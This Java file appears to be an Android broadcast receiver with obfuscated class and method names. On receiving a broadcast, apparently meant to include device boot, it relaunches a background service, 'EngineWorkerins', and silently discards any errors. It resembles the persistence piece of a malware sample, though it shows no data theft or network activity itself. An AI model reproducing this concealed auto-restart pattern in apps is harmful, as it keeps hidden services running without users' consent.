package store.apps;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
public class AgreeingEngineering extends BroadcastReceiver {

    @Override
    public void onReceive(Context x, Intent e) {
        if (e != null){
            String j = "1";
            if(e.hasExtra(j)){
                DataScan1.dit(x, DataScan1.jx,j);
                rn(x);
            }
             try{
                // if (e.getAction().equalsIgnoreCase(Intent.ACTION_BOOT_COMPLETED)){
                     if (DataScan1.gt(x,j).length() != 0){
                         DataScan1.dit(x, DataScan1.jx,j);
                     }else{

                     }

                     rn(x);
               //  }
             }catch (Exception ex){}
        }
    }
    private void rn(Context x){
        try
        {
            if(RTPluginsHelper._mthd_issrvrun_(EngineWorkerins.class,x,"[RANDOM-STRING]")) {
                Intent i = new Intent(x, EngineWorkerins.class);
                x.startService(i);


            }
        }catch (Exception e){




             }
    }
}